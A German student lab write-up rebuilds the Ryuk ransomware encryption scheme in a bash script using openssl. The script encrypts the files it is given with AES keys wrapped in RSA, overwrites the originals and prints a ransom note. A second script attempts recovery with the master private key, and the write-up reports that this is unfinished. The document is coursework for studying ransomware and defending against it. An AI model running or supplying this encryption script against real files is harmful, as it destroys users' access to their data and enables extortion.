## Übung 1.2: Ryuk - Red Team
### Angabe
Red Team = Angreifer

Erstelle ein bash Script, das mehrere Dateinamen als Argumente akzeptiert und diese Dateien nach der von Ryuk angewendeten Strategie verschlüsselt. Verwende openssl.

Z.B. alle Dateien im Verzeichnis verschlüsseln:

```
$ ryuk_ransom *
```

Nach dem Verschlüsseln aller Daten soll eine furchterregende „Ransom Note“ ausgegeben werden.

### Skript
Es wurde das Skript `ryuk_ransom` erstellt, mit dem Files verschlüsselt werden können.

Skript `ryuk_ransom`:   
```
# 1. Schlüsselverzeichnis vorbereiten
KEYDIR="./keys"
mkdir -p "$KEYDIR"
chmod 700 "$KEYDIR"

# 2. RSA-Master-Key erzeugen
openssl genrsa -out "$KEYDIR/rsa_global_private.pem" 2048
openssl rsa -in "$KEYDIR/rsa_global_private.pem" \
    -pubout -out "$KEYDIR/rsa_global_public.pem"

# 3. RSA-Victim-Key erzeugen
openssl genrsa -out "$KEYDIR/rsa_victim_private.pem" 2048
openssl rsa -in "$KEYDIR/rsa_victim_private.pem" \
    -pubout -out "$KEYDIR/rsa_victim_public.pem"

# 4. AES-Victim-Key erzeugen
openssl rand 32 > "$KEYDIR/aes_victim_key"

# 5. AES-Victim-Key mit RSA-Master-Public-Key schützen
openssl pkeyutl \
    -encrypt \
    -pubin \
    -inkey "$KEYDIR/rsa_global_public.pem" \
    -in "$KEYDIR/aes_victim_key" \
    -out "$KEYDIR/victim_key.enc"

# IV = 16 Byte Nullbytes
IV=$(printf '\0%.0s' {1..16})

# 6. Victim-Private-Key mit AES-Victim-Key schützen
openssl enc -aes-256-cbc \
    -K "$(xxd -p -c 256 "$KEYDIR/aes_victim_key")" \
    -iv "$(printf '%s' "$IV" | xxd -p -c 256)" \
    -in "$KEYDIR/rsa_victim_private.pem" \
    -out "$KEYDIR/victim_private.enc"

# 7. Für jedes Testfile:
#       AES-File-Key erzeugen
#       Testdatei verschlüsseln
#       AES-File-Key mit Victim-Public-Key verschlüsseln
#       verschlüsselten Schlüssel anhängen

for FILE in "$@"; do
    # Prüfen, ob die Datei existiert
    if [ ! -f "$FILE" ]; then
        echo "Datei nicht gefunden: $FILE"
        continue
    fi

    echo "Verschlüssele: $FILE"

    # Einen neuen zufälligen 256-Bit-AES-Key für diese Datei erzeugen
    AES_FILE_KEY="$KEYDIR/aes_file_key"
    openssl rand 32 > "$AES_FILE_KEY"

    # Datei mit AES-256-CBC und IV=0 verschlüsseln
        ENCRYPTED_FILE="${FILE}.tmp"
        openssl enc -aes-256-cbc \
            -K "$(xxd -p -c 256 "$AES_FILE_KEY")" \
            -iv "$(printf '\0%.0s' {1..16} | xxd -p -c 256)" \
            -in "$FILE" \
            -out "$ENCRYPTED_FILE"

    # AES-File-Key mit dem RSA-Victim-Public-Key verschlüsseln
    ENCRYPTED_AES_KEY="${FILE}.key"
    openssl pkeyutl \
        -encrypt \
        -pubin \
        -inkey "$KEYDIR/rsa_victim_public.pem" \
        -in "$AES_FILE_KEY" \
        -out "$ENCRYPTED_AES_KEY"

    # Den verschlüsselten AES-Key an die verschlüsselte Datei anhängen
    cat "$ENCRYPTED_AES_KEY" >> "$ENCRYPTED_FILE"

    # Originaldatei durch die verschlüsselte Datei ersetzen
    mv "$ENCRYPTED_FILE" "$FILE"

    # Temporäre Dateien löschen
    rm -f "$ENCRYPTED_AES_KEY"
    rm -f "$AES_FILE_KEY"
    echo "  -> $FILE erfolgreich verschlüsselt"

done

# 8. Test-Ransom-Note ausgeben
echo
echo "=============================================================="
echo "                    !!! WARNING !!!"
echo "=============================================================="
echo
echo "YOUR FILES HAVE BEEN ENCRYPTED!"
echo
echo "All specified files have been encrypted using AES-256-CBC."
echo "The individual AES keys have been protected using RSA-2048."
echo
echo "This is a LABORATORY SIMULATION for educational purposes."
echo "No real ransom demand is being made."
echo
echo "Encrypted files:"
for FILE in "$@"; do

    if [ -f "$FILE" ]; then

        echo "  - $FILE"

    fi

done

echo
echo "=============================================================="
```

### Erklärung des Skripts
Wir speichern vereinfacht alle Schlüssel in dem Verzeichnis `/keys`. Bei einem realen Angriff würde der `rsa_global_private` nicht auf dem Opfersystem gespeichert werden, sondern beim Angreifer bleiben.

Das Skript zwei RSA-Schlüsselpaare: einen RSA-Master-Key und einen RSA-Victim-Key.

Anschließend wird ein zufälliger 256-Bit-AES-Victim-Key erzeugt. Dieser wird mit dem öffentlichen RSA-Master-Key verschlüsselt und als `victim_key.enc` gespeichert. Der private RSA-Victim-Key wird ebenfalls mit dem AES-Victim-Key verschlüsselt.

Für jede übergebene Datei wird ein eigener zufälliger 256-Bit-AES-Schlüssel erzeugt. Mit diesem Schlüssel wird die Datei mittels AES-256-CBC verschlüsselt. Der jeweilige AES-Dateischlüssel wird danach mit dem öffentlichen RSA-Victim-Key verschlüsselt.

Der verschlüsselte AES-Schlüssel wird anschließend an das Ende der verschlüsselten Datei angehängt. Danach ersetzt die verschlüsselte Datei das Original. Temporäre Schlüsseldateien werden gelöscht.

Zum Schluss gibt das Skript eine simulierte Ransom Note aus, die über die erfolgreiche Verschlüsselung informiert.

## Übung 1.3: Ryuk - Blue Team
### Angabe
Blue Team = Verteidiger

Der `rsa_global_key_private` RSA Key ist die einzige Möglichkeit alle Dateien wieder zu entschlüsseln. Dieser key ist nur dem Angreifer bekannt.

Die Idee ist, dass das Opfer den per `rsa_global_key_public` RSA verschlüsselten `aes_victim_key` an den Angreifer schickt und dieser (nachdem das Lösegeld empfangen wurde) dem Opfer den entschlüsselten `aes_victim_key` zurückschickt. Gleichzeitig stellt der Angreifer ein Entschlüsselungstool zur Verfügung das die Daten wiederherstellt (oder wiederherstellen soll).

Nun passiert es gar nicht so selten, dass die Entschlüsselung wegen irgendwelcher Fehler nicht funktioniert. Die Motivation der Angreifer das gut zu testen ob das eh immer funktioniert ist wohl nicht allzu hoch. Es wird geschätzt das in 40% der Fälle das Entschlüsseln auch nach Zahlung des Lösegelds an irgendetwas scheitert.

Manchmal (und wirklich nur manchmal) veröffentlichen die Hacker dann den Masterkey weil sie vielleicht Mitleid mit denen haben die ihre Daten nicht entschlüsseln konnten. Das passiert allerdings natürlich erst nach einiger Zeit, wenn schon genug gezahlt haben und sich die Wirksamkeit der Ransomware durch technische Gegenmaßnahmen (Virus Scanner Updates) abgenutzt hat.

Aufgabenstellung:   
Lass einige deiner Files durch das Script eines anderen Mitschülers/Gruppe verschlüsseln. Versuche die Daten dann selbst wieder zu entschlüsseln – mit Hilfe des Master-Private-Keys (`rsa_global_key_private`) des anderen Schülers/der anderen Gruppe.

Implementiere den vollständigen Entschlüsselungsablauf als shell-script mit openssl.

### Umsetzung der Aufgabe
Umsetzung: Sarah verschlüsselt ein File und schickt das verschlüsselte File und ihren `rsa_global_key_private` an Petra.   
Petra versucht dann, dieses File mit dem erhaltenen `rsa_global_key_private` von Sarah anhand unseres Skriptes zu entschlüsseln.

Petra hat in ihrem keys-Directory einen key `hackerKey.pem` erstellt, der den `rsa_global_key_private` von Sarah enthält.   
Mit diesem Key versucht sie, das verschlüsselte File zu entschlüsseln.

### Skript
Es wurde das Skript `ryuk_decrypt2` erstellt, mit dem Files entschlüsselt werden können.

Skript `ryuk_decrypt2`:   
```
#!/bin/bash
 
KEYDIR="./keys"
 
# 1. AES-Victim-Key mit dem Global-Private-Key entschlüsseln
echo "Stelle AES-Victim-Key wieder her..."
 
openssl pkeyutl \
    -decrypt \
    -inkey "$KEYDIR/hackerKey.pem" \
    -in "$KEYDIR/victim_key.enc" \
    -out "$KEYDIR/aes_victim_key"
 
# 2. RSA-Victim-Private-Key mit dem AES-Victim-Key entschlüsseln
echo "Stelle RSA-Victim-Private-Key wieder her..."
 
openssl enc -d -aes-256-cbc \
    -K "$(xxd -p -c 256 "$KEYDIR/aes_victim_key")" \
    -iv "$(printf '\0%.0s' {1..16} | xxd -p -c 256)" \
    -in "$KEYDIR/victim_private.enc" \
    -out "$KEYDIR/rsa_victim_private.pem"
 
 
# 3. Angegebene Dateien entschlüsseln
for FILE in "$@"; do
 
    if [ ! -f "$FILE" ]; then
        echo "Datei nicht gefunden: $FILE"
        continue
    fi
 
    echo "Entschlüssele: $FILE"
 
    # Temporäre Dateien
    ENCRYPTED_DATA="${FILE}.data"
    ENCRYPTED_KEY="${FILE}.key"
    AES_FILE_KEY="$KEYDIR/aes_file_key"
    DECRYPTED_FILE="${FILE}.decrypted"
 
    # 4. Die letzten 256 Byte enthalten den RSA-verschlüsselten AES-Dateischlüssel
    tail -c 256 "$FILE" > "$ENCRYPTED_KEY"
 
    # 5. Alles davor sind die AES-verschlüsselten Daten
    head -c -256 "$FILE" > "$ENCRYPTED_DATA"
 
    # 6. AES-Dateischlüssel mit RSA-Victim-Private-Key entschlüsseln
    openssl pkeyutl \
        -decrypt \
        -inkey "$KEYDIR/rsa_victim_private.pem" \
        -in "$ENCRYPTED_KEY" \
        -out "$AES_FILE_KEY"
 
    # 7. Datei mit dem wiederhergestellten AES-Dateischlüssel entschlüsseln
    openssl enc -d -aes-256-cbc \
        -K "$(xxd -p -c 256 "$AES_FILE_KEY")" \
        -iv "$(printf '\0%.0s' {1..16} | xxd -p -c 256)" \
        -in "$ENCRYPTED_DATA" \
        -out "$DECRYPTED_FILE"
 
    # 8. Entschlüsselte Datei an ursprünglichen Namen setzen
    mv "$DECRYPTED_FILE" "$FILE"
 
    # Temporäre Dateien löschen
    rm -f "$ENCRYPTED_DATA"
    rm -f "$ENCRYPTED_KEY"
    rm -f "$AES_FILE_KEY"
 
    echo " -> $FILE erfolgreich entschlüsselt"
 
done
 
echo
echo "Alle angegebenen Dateien wurden entschlüsselt."
```

### Berechtigungen für Skript vergeben
 `chmod +x ryuk_decrypt2`   

### Problem
Unsere Umsetzung der Aufgabenstellung funktioniert noch nicht, da Petra auch den AES-Victim-Key und den RSA-Victim-Key-Private aus Sarahs key-Directory benötigt und nicht nur den `rsa_global_key_private`. Sonst würde versucht werden, mit Sarahs `rsa_global_key_private` Petras AES-Victim-key zu entschlüsseln -> das kann nicht funktionieren.     
In der Realität würden auch alle Schlüssel (außer der  `rsa_global_key_private`) auf dem Victim-System abgelegt werden.  

Aus Zeitgründen konnte dieses Problem nicht mehr gelöst werden.   
Weiters konnten wir aufgrund fehlender Zeit unsere Lösung auch nicht bei einem anderen Labor-Team austesten.
